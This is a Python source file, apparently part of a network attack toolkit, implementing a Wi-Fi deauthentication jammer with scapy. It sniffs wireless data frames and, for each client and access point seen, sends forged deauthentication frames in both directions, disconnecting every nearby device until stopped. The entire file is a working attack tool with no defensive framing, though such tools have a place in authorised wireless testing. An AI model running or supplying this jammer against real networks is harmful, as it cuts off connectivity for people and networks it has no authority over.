from src.envena.base.arguments import public_args
from src.envena.base.tool import Tool
from scapy.all import conf, get_if_hwaddr, conf, AsyncSniffer, Dot11, RadioTap, Dot11Deauth
from scapy.all import sendp

sent_packets = 0

def send_deauth(bssid, eth_src, iface)->bool:
    dot11 = Dot11(addr1=eth_src, addr2=bssid, addr3=bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    try:
        sendp(packet, iface=iface, count=1, verbose=0)
        return True
    except:
        return False

def process_pkt(pkt, logger, eth_src, iface)->None:
    global sent_packets
    if pkt.haslayer(Dot11):
        if pkt.type == 2 and pkt.addr2 != eth_src:
            if send_deauth(bssid=pkt.addr1, eth_src=pkt.addr2, iface=iface) \
                    and send_deauth(eth_src=pkt.addr1, bssid=pkt.addr2, iface=iface):
                sent_packets+=1
                logger.info(f"{sent_packets}...Sent deauth frames: {pkt.addr2} <-> {pkt.addr1}")


def jammer(param, logger)->None:
    try:
        global sent_packets
        iface = param.iface if param.iface else str(conf.iface)
        eth_src = get_if_hwaddr(iface)

        data_filter = "wlan type data"

        sniffer = AsyncSniffer(iface=iface, prn=lambda pkt: process_pkt(pkt=pkt, logger=logger, iface=iface,
                                                                        eth_src=eth_src),
                               filter=data_filter, store=0)

        sniffer.start()

        while True:
            # wait for ctrl+c
            pass

    except KeyboardInterrupt:
        if sniffer.running:
            sniffer.stop()
        logger.info(f'Jammer was stopped. {sent_packets} deauthentication packet(s) sent. (Total: {sent_packets*2})')


t_jammer = Tool(tool_func=jammer, VERSION=1.0)

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description='Dot11 deauth jammer')
    parser.add_argument("-i", "--iface", help="work interface", required=False, default=str(conf.iface))

    cli_args = parser.parse_args()
    public_args.iface = cli_args.iface

    t_jammer.start_tool()

